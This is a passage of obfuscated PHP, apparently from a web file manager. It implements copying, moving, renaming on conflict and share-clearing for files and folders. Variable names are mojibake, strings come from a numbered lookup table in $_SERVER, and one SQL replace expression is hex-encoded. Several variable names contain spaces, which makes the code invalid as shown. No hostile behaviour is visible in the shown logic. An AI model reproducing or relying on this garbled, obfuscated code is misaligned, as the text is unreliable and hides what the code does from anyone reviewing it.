_copy($Œµ¬»İ, $Äµ’íç¥, $Óñ†âÃ, &$çé©€, $ûû®Ñ°‘, $ôõ½«ü = '') { $ÁÑ¢ÕŒæ =& $_SERVER[Ö†ØøÖ±]; $…”ÄîŠÂ = $this->sourceInfoCache($Œµ¬»İ); $Ğ¶àÕá¿ = $…”ÄîŠÂ[$ÁÑ¢ÕŒæ[462]] == $ÁÑ¢ÕŒæ[88]; $®½òÇŠ = $ôõ½«ü ? $ôõ½«ü : $…”ÄîŠÂ[$ÁÑ¢ÕŒæ[32]]; $‚ÖªÌÃ³ = $this->fileNameExistAuto($Äµ’íç¥, $…”ÄîŠÂ); if ($ûû®Ñ°‘) { $this->_childrenAllMake($Œµ¬»İ); if ($Ğ¶àÕá¿ && $‚ÖªÌÃ³) { $this->_childrenAllMake($‚ÖªÌÃ³); } } if (!$‚ÖªÌÃ³) { return $this->_copyCreate($Œµ¬»İ, $Äµ’íç¥, $®½òÇŠ, $çé©€); } $â•é¹ = $‚ÖªÌÃ³; if ($Ğ¶àÕá¿) { if ($Óñ†âÃ == REPEAT_RENAME_FOLDER) { $®½òÇŠ = $this->fileNameAutoCache($Äµ’íç¥, $®½òÇŠ, $Óñ†âÃ, $Ğ¶àÕá¿); $â•é¹ = $this->_copyCreate($Œµ¬»İ, $Äµ’íç¥, $®½òÇŠ, $çé©€); } else { $ïğÚ’Ñ´ = $this->_childrenList($Œµ¬»İ); foreach ($ïğÚ’Ñ´ as $Ûè†Çì) { $this->_copy($Ûè†Çì[$ÁÑ¢ÕŒæ[181]], $‚ÖªÌÃ³, $Óñ†âÃ, $çé©€, !1); } } } else { if ($Óñ†âÃ == REPEAT_RENAME || $Óñ†âÃ == REPEAT_RENAME_FOLDER) { $®½òÇŠ = $this->fileNameAutoCache($Äµ’íç¥, $®½òÇŠ, $Óñ†âÃ, $Ğ¶àÕá¿); $â•é¹ = $this->_copyCreate($Œµ¬»İ, $Äµ’íç¥, $®½òÇŠ, $çé©€); } else { if ($Óñ†âÃ == REPEAT_REPLACE) { $Ì‹¯õ” = $this->sourceInfoCache($‚ÖªÌÃ³); $ãäÄÙ‘° = $this->fileHistory($Ì‹¯õ”, $…”ÄîŠÂ[$ÁÑ¢ÕŒæ[518]], $…”ÄîŠÂ[$ÁÑ¢ÕŒæ[76]]); if ($ãäÄÙ‘°) { $çé©€[$ÁÑ¢ÕŒæ[606]][] = $…”ÄîŠÂ[$ÁÑ¢ÕŒæ[518]]; } } else { if ($Óñ†âÃ == REPEAT_SKIP) { } } } Hook::trigger($ÁÑ¢ÕŒæ[611], array($ÁÑ¢ÕŒæ[612], $…”ÄîŠÂ, 0)); } return $â•é¹; } private function _copyCreate($ÕŠÍı—Î, $É”×ö“, $ø‰ñşş‡, &$â»Ø˜ß´) { $‹•È­í =& $_SERVER[Ö†ØøÖ±]; $ªíøØñ = $this->sourceInfoCache($ÕŠÍı—Î); $•ß™ú = $this->sourceInfoCache($É”×ö“); $îß³—¼ = $this->_makeItemData($ªíøØñ, $•ß™ú, $ø‰ñşş‡); Hook::trigger($‹•È­í[613], $îß³—¼); Hook::trigger($‹•È­í[614], array($‹•È­í[615], $îß³—¼, 0)); $–šäîĞì = $this->add($îß³—¼); $Ø³ªœÁá = array($‹•È­í[181] => $–šäîĞì, $‹•È­í[32] => $ø‰ñşş‡); $this->_copyApplyMeta($Ø³ªœÁá, $â»Ø˜ß´); if ($ªíøØñ[$‹•È­í[462]] != $‹•È­í[88]) { $â»Ø˜ß´[$‹•È­í[606]][] = $ªíøØñ[$‹•È­í[518]]; return $–šäîĞì; } $´×ö‡î´ = array(); $¹Ÿ‘î¶— = array(); $this->_childrenListAll($ÕŠÍı—Î, $´×ö‡î´); $ã’ß±ŠÁ = count($´×ö‡î´); if ($ã’ß±ŠÁ == 0) { return $–šäîĞì; } $À‚‡µ·Ç = $this->sourceInfo($–šäîĞì); foreach ($´×ö‡î´ as $¦¡ú©øÇ) { $®ÇÄóºÅ = $this->_makeItemData($¦¡ú©øÇ, $À‚‡µ·Ç, $¦¡ú©øÇ[$‹•È­í[32]]); $®ÇÄóºÅ[$‹•È­í[562]] = $¦¡ú©øÇ[$‹•È­í[562]]; $¹Ÿ‘î¶—[] = $®ÇÄóºÅ; } $this->chunkEventSet($‹•È­í[616], array($‹•È­í[617], $îß³—¼, $ã’ß±ŠÁ)); $this->addAll($¹Ÿ‘î¶—, array(), !1); $¥ª™µÑŸ = $this->where(array($‹•È­í[180] => $–šäîĞì))->select(); $™¸çüê¦ = $this->_childrenMakeRelation($´×ö‡î´, $¥ª™µÑŸ); $™¸çüê¦[$ÕŠÍı—Î] = $–šäîĞì; $·‹…½üÔ = array(); $Óóêî€Ù = array(); foreach ($¥ª™µÑŸ as $¦¡ú©øÇ) { $Áôì³ · = $¦¡ú©øÇ[$‹•È­í[181]]; $í–°¿ü° = $this->_childrenMatch($™¸çüê¦, $¦¡ú©øÇ, $À‚‡µ·Ç); $·‹…½üÔ[] = array($‹•È­í[181], $Áôì³ ·, $‹•È­í[180], $í–°¿ü°[$‹•È­í[180]]); $Óóêî€Ù[] = array($‹•È­í[181], $Áôì³ ·, $‹•È­í[562], $í–°¿ü°[$‹•È­í[562]]); $this->_copyApplyMeta($¦¡ú©øÇ, $â»Ø˜ß´); if ($¦¡ú©øÇ[$‹•È­í[462]] != $‹•È­í[88]) { $â»Ø˜ß´[$‹•È­í[606]][] = $¦¡ú©øÇ[$‹•È­í[518]]; } } $this->chunkEventSet($‹•È­í[618], array($‹•È­í[619], $îß³—¼, $ã’ß±ŠÁ)); $this->saveAll($·‹…½üÔ); $this->chunkEventSet($‹•È­í[620], array($‹•È­í[621], $îß³—¼, $ã’ß±ŠÁ)); $this->saveAll($Óóêî€Ù); return $–šäîĞì; } private function _childrenMakeRelation($ºÛÒ‹ôÊ, $€™ˆ»ùı) { $š¸àãÆ¯ =& $_SERVER[Ö†ØøÖ±]; $Ñ­³œ¯Á = array(); $¿’¡å¡ = array(); foreach ($ºÛÒ‹ôÊ as $ø±ğ×Ôí) { $Ÿ«Ã™»¦ = $ø±ğ×Ôí[$š¸àãÆ¯[32]] . $š¸àãÆ¯[8] . $ø±ğ×Ôí[$š¸àãÆ¯[562]]; $Ñ­³œ¯Á[$Ÿ«Ã™»¦] = $ø±ğ×Ôí[$š¸àãÆ¯[181]]; } foreach ($€™ˆ»ùı as $ø±ğ×Ôí) { $Ÿ«Ã™»¦ = $ø±ğ×Ôí[$š¸àãÆ¯[32]] . $š¸àãÆ¯[8] . $ø±ğ×Ôí[$š¸àãÆ¯[562]]; $İÉñõß = $Ñ­³œ¯Á[$Ÿ«Ã™»¦]; $¿’¡å¡[$İÉñõß] = $ø±ğ×Ôí[$š¸àãÆ¯[181]]; } return $¿’¡å¡; } private function _childrenMatch($±ºõàÆù, $÷–µúêû, $øç¤«¤¨) { $°‡¸˜‡ê =& $_SERVER[Ö†ØøÖ±]; $œÎ×ïç¦ = $øç¤«¤¨[$°‡¸˜‡ê[562]]; $ÂÈ™Ø¼™ = $this->parentLevelArray($÷–µúêû[$°‡¸˜‡ê[562]]); foreach ($ÂÈ™Ø¼™ as $½÷£ñéõ) { if (isset($±ºõàÆù[$½÷£ñéõ])) { $œÎ×ïç¦ .= $±ºõàÆù[$½÷£ñéõ] . $°‡¸˜‡ê[622]; } } $œÎ×ïç¦ = rtrim($œÎ×ïç¦, $°‡¸˜‡ê[50]) . $°‡¸˜‡ê[50]; $¾û§¼ÔÂ = $this->parentLevelArray($œÎ×ïç¦); $´ºˆ°†£ = $¾û§¼ÔÂ[count($¾û§¼ÔÂ) - 1]; return array($°‡¸˜‡ê[180] => $´ºˆ°†£, $°‡¸˜‡ê[562] => $œÎ×ïç¦); } private function _makeItemData($ığŒ¢˜Ò, $©İ‡˜ ¬, $æÅŠŞà‘) { $éªº˜£… =& $_SERVER[Ö†ØøÖ±]; $Í““ÍÆâ = array($éªº˜£…[623] => $ığŒ¢˜Ò[$éªº˜£…[462]], $éªº˜£…[471] => $æÅŠŞà‘, $éªº˜£…[624] => $ığŒ¢˜Ò[$éªº˜£…[463]] ? $ığŒ¢˜Ò[$éªº˜£…[463]] : $éªº˜£…[12], $éªº˜£…[519] => $ığŒ¢˜Ò[$éªº˜£…[518]] ? $ığŒ¢˜Ò[$éªº˜£…[518]] : 0, $éªº˜£…[594] => $ığŒ¢˜Ò[$éªº˜£…[76]] ? $ığŒ¢˜Ò[$éªº˜£…[76]] : 0, $éªº˜£…[625] => intval($©İ‡˜ ¬[$éªº˜£…[178]]), $éªº˜£…[626] => intval($©İ‡˜ ¬[$éªº˜£…[547]]), $éªº˜£…[627] => intval(USER_ID), $éªº˜£…[628] => intval(USER_ID), $éªº˜£…[454] => intval($©İ‡˜ ¬[$éªº˜£…[181]]), $éªº˜£…[629] => $©İ‡˜ ¬[$éªº˜£…[562]] . $©İ‡˜ ¬[$éªº˜£…[181]] . $éªº˜£…[50], $éªº˜£…[475] => $ığŒ¢˜Ò[$éªº˜£…[85]] ? $ığŒ¢˜Ò[$éªº˜£…[85]] : time(), $éªº˜£…[481] => 0, $éªº˜£…[630] => $éªº˜£…[12]); return $Í““ÍÆâ; } private function _copyApplyMeta($²”·ş¥Ğ, &$Ë›ÛŒ´) { $üò£Á–¶ =& $_SERVER[Ö†ØøÖ±]; $©İ…Ç– = $²”·ş¥Ğ[$üò£Á–¶[181]]; $ºå»Ï¼Ä = $²”·ş¥Ğ[$üò£Á–¶[32]]; if (!isset($²”·ş¥Ğ[$üò£Á–¶[631]]) || !$²”·ş¥Ğ[$üò£Á–¶[631]] || $²”·ş¥Ğ[$üò£Á–¶[631]] == $üò£Á–¶[212]) { $Ë›ÛŒ´[$üò£Á–¶[608]][] = array($üò£Á–¶[181], $©İ…Ç–, $üò£Á–¶[631], short_id($©İ…Ç–)); } if (Input::check($ºå»Ï¼Ä, $üò£Á–¶[632])) { $Ë›ÛŒ´[$üò£Á–¶[607]][] = array($üò£Á–¶[181] => $©İ…Ç–, $üò£Á–¶[94] => $üò£Á–¶[515], $üò£Á–¶[427] => str_replace($üò£Á–¶[53], $üò£Á–¶[12], Pinyin::get($ºå»Ï¼Ä))); $Ë›ÛŒ´[$üò£Á–¶[607]][] = array($üò£Á–¶[181] => $©İ…Ç–, $üò£Á–¶[94] => $üò£Á–¶[514], $üò£Á–¶[427] => Pinyin::get($ºå»Ï¼Ä, $üò£Á–¶[633])); } $Ë›ÛŒ´[$üò£Á–¶[607]][] = array($üò£Á–¶[181] => $©İ…Ç–, $üò£Á–¶[94] => $üò£Á–¶[494], $üò£Á–¶[427] => KodSort::makeStr($ºå»Ï¼Ä)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ş§‹ü£–) { $É­ƒëÂ =& $_SERVER[Ö†ØøÖ±]; $Ñ°—¯Äœ = $this->sourceInfo($Ş§‹ü£–); $ÊÜÃÜü = $É­ƒëÂ[634]; $¬®ı„òŠ = array($É­ƒëÂ[562] => array($É­ƒëÂ[589], $Ñ°—¯Äœ[$É­ƒëÂ[562]] . $Ş§‹ü£– . $É­ƒëÂ[590]), $É­ƒëÂ[482] => $this->targetIsDelete); $È‚ó¹­¾ = $this->field($ÊÜÃÜü)->where($¬®ı„òŠ)->select(); if (!$È‚ó¹­¾) { return; } $È‚ó¹­¾ = array_to_keyvalue($È‚ó¹­¾, $É­ƒëÂ[181]); foreach ($È‚ó¹­¾ as $ÒÎò«í) { $ ñ€Å¬– = $ÒÎò«í[$É­ƒëÂ[180]]; $Ş§‹ü£– = $ÒÎò«í[$É­ƒëÂ[181]]; if (!isset($this->_childrenListCache[$Ş§‹ü£–]) && $ÒÎò«í[$É­ƒëÂ[462]] == $É­ƒëÂ[88]) { $this->_childrenListCache[$Ş§‹ü£–] = array(); } if (!isset($this->_childrenListCache[$ ñ€Å¬–])) { $this->_childrenListCache[$ ñ€Å¬–] = array(); } $this->_childrenListCache[$ ñ€Å¬–][$Ş§‹ü£–] = $ÒÎò«í; $this->_childrenItemCache[$Ş§‹ü£–] = $ÒÎò«í; } } private function _childrenListAll($òò™ûş‡, &$„áğì‰) { $ıØ­Í =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->_childrenListCache[$òò™ûş‡])) { return; } $°Õø©± = $this->_childrenListCache[$òò™ûş‡]; foreach ($°Õø©± as $Ø¾¦œç‘ => $üñˆİ—) { $„áğì‰[$Ø¾¦œç‘] = $üñˆİ—; if ($üñˆİ—[$ıØ­Í[462]] == $ıØ­Í[88]) { $this->_childrenListAll($Ø¾¦œç‘, $„áğì‰); } } } private function sourceInfoCache($×é¶†È) { if (isset($this->_childrenItemCache[$×é¶†È])) { return $this->_childrenItemCache[$×é¶†È]; } return $this->sourceInfo($×é¶†È); } private function _childrenList($ôĞ’¹©¦) { if (isset($this->_childrenListCache[$ôĞ’¹©¦])) { return $this->_childrenListCache[$ôĞ’¹©¦]; } return $this->_childrenListSelect($ôĞ’¹©¦); } private function _childrenListSelect($Š‘ÚêÒ) { $º…ßÖÀã =& $_SERVER[Ö†ØøÖ±]; $’€À¢öÀ = array($º…ßÖÀã[180] => $Š‘ÚêÒ, $º…ßÖÀã[482] => $this->targetIsDelete); $ğ’¬é¨ = $this->where($’€À¢öÀ)->select(); $ğ’¬é¨ = $ğ’¬é¨ ? $ğ’¬é¨ : array(); $‰€ğúŠ¸ = array_to_keyvalue($ğ’¬é¨, $º…ßÖÀã[181]); $this->_childrenListCache[$Š‘ÚêÒ] = $‰€ğúŠ¸; foreach ($‰€ğúŠ¸ as $Š‘ÚêÒ => $ ´ì) { $this->_childrenItemCache[$Š‘ÚêÒ] = $ ´ì; } return $‰€ğúŠ¸; } private function fileNameExistAuto($²ïôœàê, $ÒÈøÙ´ı) { $ıü—¼É =& $_SERVER[Ö†ØøÖ±]; if ($ÒÈøÙ´ı[$ıü—¼É[482]] == $ıü—¼É[88]) { return $this->fileNameExist($²ïôœàê, $ÒÈøÙ´ı[$ıü—¼É[32]]); } return $this->fileNameExistCache($²ïôœàê, $ÒÈøÙ´ı[$ıü—¼É[32]]); } private function fileNameExistCache($í·»‡æø, $òüòÃİ) { $üÆÈá†§ =& $_SERVER[Ö†ØøÖ±]; $òüòÃİ = strtolower($òüòÃİ); $²ÃÆßÑÓ = $this->_childrenList($í·»‡æø); foreach ($²ÃÆßÑÓ as $šø„¼±”) { if ($òüòÃİ == strtolower($šø„¼±”[$üÆÈá†§[32]])) { return $šø„¼±”[$üÆÈá†§[181]]; } } return !1; } private function fileNameAutoCache($Â³¿ÇÀÎ, $—› Êúã, $‡÷¢úä, $¿¢Œé˜) { $ë±ŞŠİ¿ =& $_SERVER[Ö†ØøÖ±]; $Â¾›Å•© = $this->_childrenList($Â³¿ÇÀÎ); $Ìàè¤ì” = array_to_keyvalue($Â¾›Å•©, $ë±ŞŠİ¿[12], $ë±ŞŠİ¿[32]); return $this->fileNameAutoGet($Ìàè¤ì”, $—› Êúã, $‡÷¢úä, $¿¢Œé˜); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($åïûè, $öé‰Ì£, $¢äó¿Ôï = REPEAT_REPLACE, $ñú¸¿‰ = '') { $ª ˆÎ =& $_SERVER[Ö†ØøÖ±]; $‘Áö”Ş = $this->sourceInfo($åïûè); $ÒÓÅ‰»ü = $this->sourceInfo($öé‰Ì£); if ($‘Áö”Ş[$ª ˆÎ[180]] == $ÒÓÅ‰»ü[$ª ˆÎ[181]]) { if ($‘Áö”Ş[$ª ˆÎ[482]] == $ª ˆÎ[88]) { Model($ª ˆÎ[480])->restore(array($åïûè)); } if (!$ñú¸¿‰ || $ñú¸¿‰ == $‘Áö”Ş[$ª ˆÎ[32]]) { return $åïûè; } } $º…Ë«…” = $this->pathInfoMore($åïûè); if ($this->isParentOf($åïûè, $öé‰Ì£)) { return !1; } if (!$‘Áö”Ş || !$ÒÓÅ‰»ü || $ÒÓÅ‰»ü[$ª ˆÎ[462]] != $ª ˆÎ[88]) { return !1; } Hook::trigger($ª ˆÎ[635], $º…Ë«…”); $this->targetIsDelete = intval($‘Áö”Ş[$ª ˆÎ[482]]); if ($‘Áö”Ş[$ª ˆÎ[180]] == $öé‰Ì£ && $ñú¸¿‰ != $‘Áö”Ş[$ª ˆÎ[32]]) { $¥íÊÆù³ = $this->fileNameExist($öé‰Ì£, $ñú¸¿‰); if ($¥íÊÆù³ && $‘Áö”Ş[$ª ˆÎ[462]] == $ª ˆÎ[212]) { $˜„õ·Ø = $this->sourceInfo($¥íÊÆù³); $ÏŒ˜šßÀ = $this->fileHistory($˜„õ·Ø, $‘Áö”Ş[$ª ˆÎ[518]], $‘Áö”Ş[$ª ˆÎ[76]]); if (!$ÏŒ˜šßÀ) { Model($ª ˆÎ[521])->remove($‘Áö”Ş[$ª ˆÎ[518]]); } $this->removeNow($åïûè, !1); $this->folderSizeReset($öé‰Ì£); Hook::trigger($ª ˆÎ[636], $º…Ë«…”); return $¥íÊÆù³; } } $ÎÏ¦ÌÖë = $ñú¸¿‰ ? $ñú¸¿‰ : $‘Áö”Ş[$ª ˆÎ[32]]; $this->lockMoveStart($åïûè); $this->lockWriteStart($öé‰Ì£, $ÎÏ¦ÌÖë); $šŒ©ôú = array($ª ˆÎ[606] => array(), $ª ˆÎ[637] => !1); $this->clearShare($åïûè, $öé‰Ì£); $€ã…à§Ú = $this->fileNameExistAuto($öé‰Ì£, $‘Áö”Ş); $²ûÅ«ÑÔ = $this->_move($åïûè, $öé‰Ì£, $¢äó¿Ôï, $šŒ©ôú, $ñú¸¿‰); $this->sourceCacheClear(); if ($‘Áö”Ş[$ª ˆÎ[462]] == $ª ˆÎ[88] && $€ã…à§Ú) { $this->folderSizeResetChildren($²ûÅ«ÑÔ); } Model($ª ˆÎ[214])->linkAdd($šŒ©ôú[$ª ˆÎ[606]]); if ($€ã…à§Ú && $šŒ©ôú[$ª ˆÎ[637]]) { $this->removeNow($åïûè, !1); } $this->lockMoveEnd($åïûè); $this->lockWriteEnd($öé‰Ì£, $ÎÏ¦ÌÖë); $this->folderSizeReset($‘Áö”Ş[$ª ˆÎ[180]]); $this->folderSizeReset($öé‰Ì£); $‹ÊóÏèª = array($‘Áö”Ş[$ª ˆÎ[180]], $öé‰Ì£); if ($‘Áö”Ş[$ª ˆÎ[462]] == $ª ˆÎ[88]) { $‹ÊóÏèª[] = $åïûè; } $this->updateModifyTime($‹ÊóÏèª); Model($ª ˆÎ[610])->eventMove($åïûè, $‘Áö”Ş[$ª ˆÎ[180]], $öé‰Ì£); Hook::trigger($ª ˆÎ[636], $º…Ë«…”); return $²ûÅ«ÑÔ; } private function _move($ï«ñË®ª, $ÊŠ™§°, $îİ™×Áà, &$ˆÕ¨ğÌ‹, $¥’µÎ¢‡ = '') { $×»†ñåã =& $_SERVER[Ö†ØøÖ±]; $ÁÖ²–íŠ = $this->sourceInfo($ï«ñË®ª); $›Ï£—Áó = $ÁÖ²–íŠ[$×»†ñåã[462]] == $×»†ñåã[88]; $ê²ˆÂá = $¥’µÎ¢‡ ? $¥’µÎ¢‡ : $ÁÖ²–íŠ[$×»†ñåã[32]]; $ĞîÍÌ»ı = $this->fileNameExistAuto($ÊŠ™§°, $ÁÖ²–íŠ); $this->lockMoveStart($ï«ñË®ª); $this->lockWriteStart($ÊŠ™§°, $ê²ˆÂá); if (!$ĞîÍÌ»ı) { return $this->_moveForce($ï«ñË®ª, $ÊŠ™§°, $ê²ˆÂá); } $ï§ÆèæÂ = $ĞîÍÌ»ı; $µƒÉÕÄˆ = !1; if ($›Ï£—Áó) { if ($îİ™×Áà == REPEAT_RENAME_FOLDER) { $ê²ˆÂá = $this->fileNameAuto($ÊŠ™§°, $ê²ˆÂá, $îİ™×Áà, $›Ï£—Áó); $ï§ÆèæÂ = $this->_moveForce($ï«ñË®ª, $ÊŠ™§°, $ê²ˆÂá); } else { if ($îİ™×Áà == REPEAT_RENAME_FOLDER) { $îİ™×Áà = REPEAT_RENAME; } $¦®ÙÓ¸ı = $this->_childrenListSelect($ï«ñË®ª); foreach ($¦®ÙÓ¸ı as $üíÑ½İô) { $this->_move($üíÑ½İô[$×»†ñåã[181]], $ĞîÍÌ»ı, $îİ™×Áà, $ˆÕ¨ğÌ‹); } $µƒÉÕÄˆ = !0; } } else { if ($îİ™×Áà == REPEAT_SKIP) { $µƒÉÕÄˆ = !0; } else { if ($îİ™×Áà == REPEAT_RENAME || $îİ™×Áà == REPEAT_RENAME_FOLDER) { $ê²ˆÂá = $this->fileNameAuto($ÊŠ™§°, $ê²ˆÂá, $îİ™×Áà, $›Ï£—Áó); $ï§ÆèæÂ = $this->_moveForce($ï«ñË®ª, $ÊŠ™§°, $ê²ˆÂá); } else { if ($îİ™×Áà == REPEAT_REPLACE) { $İÇîœºš = $this->sourceInfoCache($ĞîÍÌ»ı); $ÅÄŒÈ†µ = $this->fileHistory($İÇîœºš, $ÁÖ²–íŠ[$×»†ñåã[518]], $ÁÖ²–íŠ[$×»†ñåã[76]]); $µƒÉÕÄˆ = !0; if ($ÅÄŒÈ†µ) { $ˆÕ¨ğÌ‹[$×»†ñåã[606]][] = $ÁÖ²–íŠ[$×»†ñåã[518]]; } } } } } if ($µƒÉÕÄˆ && !$ˆÕ¨ğÌ‹[$×»†ñåã[637]]) { $ˆÕ¨ğÌ‹[$×»†ñåã[637]] = !0; } return $ï§ÆèæÂ; } private function _moveForce($Õ§ŸÆèË, $é¡Ø·È, $ŠÔ‡‰è¢) { $ºˆñØ† =& $_SERVER[Ö†ØøÖ±]; $Õ¥‡¸­ = $this->sourceInfo($Õ§ŸÆèË); $ß¶›ÔüÃ = $this->sourceInfo($é¡Ø·È); $Â×‰Éˆ½ = $Õ¥‡¸­[$ºˆñØ†[462]] == $ºˆñØ†[88]; $èßÖ§“ğ = array($ºˆñØ†[454] => $ß¶›ÔüÃ[$ºˆñØ†[181]], $ºˆñØ†[629] => $ß¶›ÔüÃ[$ºˆñØ†[562]] . $ß¶›ÔüÃ[$ºˆñØ†[181]] . $ºˆñØ†[50], $ºˆñØ†[625] => $ß¶›ÔüÃ[$ºˆñØ†[178]], $ºˆñØ†[626] => $ß¶›ÔüÃ[$ºˆñØ†[547]], $ºˆñØ†[628] => USER_ID, $ºˆñØ†[471] => $ŠÔ‡‰è¢); $¹Õ–™ïŒ = $Õ¥‡¸­[$ºˆñØ†[178]] == SourceModel::TYPE_GROUP && $ß¶›ÔüÃ[$ºˆñØ†[178]] == SourceModel::TYPE_GROUP && $Õ¥‡¸­[$ºˆñØ†[547]] == $ß¶›ÔüÃ[$ºˆñØ†[547]]; if (!$¹Õ–™ïŒ && $this->moveClearAuth) { Model($ºˆñØ†[544])->authClear($Õ§ŸÆèË); } $ìü»ï¢“ = $Õ¥‡¸­[$ºˆñØ†[482]] == $ºˆñØ†[88] && $ß¶›ÔüÃ[$ºˆñØ†[482]] != $ºˆñØ†[88]; if ($ìü»ï¢“) { $èßÖ§“ğ[$ºˆñØ†[481]] = 0; } if ($Â×‰Éˆ½) { $ø¬ş¹ç = array($ºˆñØ†[629] => array($ºˆñØ†[589], $Õ¥‡¸­[$ºˆñØ†[562]] . $Õ¥‡¸­[$ºˆñØ†[181]] . $ºˆñØ†[590])); $½¸ßÛà¶ = $Õ¥‡¸­[$ºˆñØ†[562]] . $Õ¥‡¸­[$ºˆñØ†[181]] . $ºˆñØ†[50]; $îáĞê² = $ß¶›ÔüÃ[$ºˆñØ†[562]] . $ß¶›ÔüÃ[$ºˆñØ†[181]] . $ºˆñØ†[50] . $Õ¥‡¸­[$ºˆñØ†[181]] . $ºˆñØ†[50]; $İóÅÕ­– = array($ºˆñØ†[629] => array($ºˆñØ†[638], "\x72\145\x70\x6c\141\143\x65\x28\160\141\x72\x65\156\x74\114\145\x76\145\x6c\x2c\47{$½¸ßÛà¶}\x27\x2c\x27{$îáĞê²}\x27\51"), $ºˆñØ†[625] => $ß¶›ÔüÃ[$ºˆñØ†[178]], $ºˆñØ†[626] => $ß¶›ÔüÃ[$ºˆñØ†[547]]); if ($ìü»ï¢“) { $İóÅÕ­–[$ºˆñØ†[481]] = 0; } $this->where($ø¬ş¹ç)->data($İóÅÕ­–)->save(); } $this->where(array($ºˆñØ†[468] => $Õ§ŸÆèË))->data($èßÖ§“ğ)->save(); return $Õ§ŸÆèË; } private function clearShare($±Ìòàæú, $Á­ôÎáÓ) { $ÊÜî”¤ =& $_SERVER[Ö†ØøÖ±]; $‰ŞÉÛ÷ = $this->sourceInfo($±Ìòàæú); $ÜÛü–¶‰ = $this->sourceInfo($Á­ôÎáÓ); if ($‰ŞÉÛ÷[$ÊÜî”¤[547]] == $ÜÛü–¶‰[$ÊÜî”¤[547]] && $‰ŞÉÛ÷[$ÊÜî”¤[178]] == $ÊÜî”¤[639]) { return; } $˜‹©Îš± = array($ÊÜî”¤[562] => array($ÊÜî”¤[589], $‰ŞÉÛ÷[$ÊÜî”¤[562]] . $±Ìòàæú . $ÊÜî”¤[590])); $“Ùå¥Õ— = $this->field($ÊÜî”¤[468])->where($˜‹©Îš±)->getField($ÊÜî”¤[181], !0); if (!$“Ùå¥Õ—) { return; } $˜‹©Îš± = array($ÊÜî”¤[181] => array($ÊÜî”¤[7], $“Ùå¥Õ—), $ÊÜî”¤[640] => 1); $ù’‚¿åè = Model($ÊÜî”¤[641])->field($ÊÜî”¤[642])->where($˜‹©Îš±)->select(); if (!$ù’‚¿åè) { return; } $ù’‚¿åè = array_to_keyvalue($ù’‚¿åè, $ÊÜî”¤[12], $ÊÜî”¤[642]); $˜‹©Îš± = array($ÊÜî”¤[642] => array($ÊÜî”¤[7], $ù’‚¿åè)); Model($ÊÜî”¤[641])->where($˜‹©Îš±)->save(array($ÊÜî”¤[640] => 0)); Model($ÊÜî”¤[643])->where($˜‹©Îš±)->delete(); } public function copyFolderFromIO($Ñ‹«¹å, $Ğ…ÂïÖô, $’Èãæˆ, $Áä—Â·ï, $ß¼ş›Ò£, $½‹‡Ìù = false) { $ é‹í©ø =& $_SERVER[Ö†ØøÖ±]; $ªÔ˜­´Õ = array($ é‹í©ø[607] => array(), $ é‹í©ø[608] => array(), $ é‹í©ø[606] => array(), $ é‹í©ø[644] => array()); $¨€–Ğò˜ = $½‹‡Ìù ? $½‹‡Ìù : $Ñ‹«¹å->pathThis($Ğ…ÂïÖô); $šÙÓÊ€Û = $this->fileNameExist($’Èãæˆ, $¨€–Ğò˜); $¢¹–áå = $this->mkdir($’Èãæˆ, $¨€–Ğò˜, $Áä—Â·ï); if (!$šÙÓÊ€Û || $Áä—Â·ï == REPEAT_RENAME_FOLDER) { $Áä—Â·ï = !1; } if ($šÙÓÊ€Û) { $this->_childrenAllMake($šÙÓÊ€Û); } Hook::trigger($ é‹í©ø[645]); $this->_copyChildTo($Ñ‹«¹å, $Ğ…ÂïÖô, $¢¹–áå, $Áä—Â·ï, $ªÔ˜­´Õ, $ß¼ş›Ò£); Hook::trigger($ é‹í©ø[646]); if ($¢¹–áå) { $this->folderSizeResetChildren($¢¹–áå); } $this->_childrenListClear(); Model($ é‹í©ø[609])->addAll($ªÔ˜­´Õ[$ é‹í©ø[607]], array(), !0); Model($ é‹í©ø[610])->eventCopy($¢¹–áå); $this->saveAll($ªÔ˜­´Õ[$ é‹í©ø[608]]); Model($ é‹í©ø[521])->linkAdd($ªÔ˜­´Õ[$ é‹í©ø[606]]); Model($ é‹í©ø[521])->remove($ªÔ˜­´Õ[$ é‹í©ø[644]]); $this->folderSizeReset($’Èãæˆ); $this->updateModifyTime($’Èãæˆ); return $¢¹–áå; } private function _copyChildTo($ÊÙüìó, $¥çƒ«ä®, $äœ÷®ƒ™, $Ñ½£­‚, &$ëÛÄ™Íã, $¨ì¼€Ú“) { $Û¾³¤”ç =& $_SERVER[Ö†ØøÖ±]; $¯ÒÓ£¥ = $this->sourceInfoCache($äœ÷®ƒ™); $ŒáıŸº = $ÊÙüìó->listPath($¥çƒ«ä®); $ŒáıŸº = $ŒáıŸº ? $ŒáıŸº : array($Û¾³¤”ç[83] => array(), $Û¾³¤”ç[82] => array()); $‚÷Ç¼«¨ = array_merge($ŒáıŸº[$Û¾³¤”ç[83]], $ŒáıŸº[$Û¾³¤”ç[82]]); $È¬‡ É = $this->_addFiles($ÊÙüìó, $ŒáıŸº[$Û¾³¤”ç[83]], $¨ì¼€Ú“); $É®³öí« = array(); foreach ($‚÷Ç¼«¨ as &$Í‡•„ş¥) { if (isset($È¬‡ É[$Í‡•„ş¥[$Û¾³¤”ç[32]]])) { $Í‡•„ş¥ = $È¬‡ É[$Í‡•„ş¥[$Û¾³¤”ç[32]]]; } $Í‡•„ş¥[$Û¾³¤”ç[462]] = $Í‡•„ş¥[$Û¾³¤”ç[33]] == $Û¾³¤”ç[75]; $Í‡•„ş¥[$Û¾³¤”ç[463]] = substr(_get($Í‡•„ş¥, $Û¾³¤”ç[175], $Û¾³¤”ç[12]), 0, 10); $Í‡•„ş¥[$Û¾³¤”ç[76]] = _get($Í‡•„ş¥, $Û¾³¤”ç[76], 0); $Í‡•„ş¥[$Û¾³¤”ç[518]] = _get($Í‡•„ş¥, $Û¾³¤”ç[518], 0); if (!isset($Í‡•„ş¥[$Û¾³¤”ç[647]]) && $Í‡•„ş¥[$Û¾³¤”ç[518]]) { $ëÛÄ™Íã[$Û¾³¤”ç[644]][] = $Í‡•„ş¥[$Û¾³¤”ç[518]]; } if ($Ñ½£­‚) { $šÑ´Ù‚­ = $this->fileNameExistCache($äœ÷®ƒ™, $Í‡•„ş¥[$Û¾³¤”ç[32]]); if ($šÑ´Ù‚­) { if ($Í‡•„ş¥[$Û¾³¤”ç[462]] || 